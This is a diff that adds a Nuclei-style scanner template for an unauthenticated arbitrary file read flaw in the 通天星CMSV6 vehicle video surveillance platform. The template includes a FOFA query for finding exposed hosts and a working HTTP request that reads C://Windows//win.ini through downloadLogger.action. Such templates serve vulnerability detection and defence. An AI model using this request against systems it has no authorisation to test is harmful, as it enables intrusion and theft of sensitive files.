@@ -1,0 +1,29 @@
+id: tongtianxingCMSV6-downloadLogger_action-File-reading
+
+info:
+  name: "通天星CMSV6 downloadLogger.action 接口任意文件读取"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/808gps/"
+    通天星CMSV6车载视频监控平台的downloadLogger.action接口存在任意文件读取安全缺陷。攻击者无需身份验证即可访问系统内部敏感文件，导致系统面临严重安全风险。该漏洞可能被利用获取配置文件、日志文件或其他关键系统数据，造成数据泄露和权限突破。
+  reference:
+  - https://mp.weixin.qq.com/s/Wu0yXcniK3h3WJOkqeH2RA
+  tags: 通天星CMSV6
+
+
+http:
+- raw:
+  - |
+    GET /808gps/logger/downloadLogger.action?fileName=C://Windows//win.ini HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '; for 16-bit app support'
+  - type: status
+    status:
+    - 200
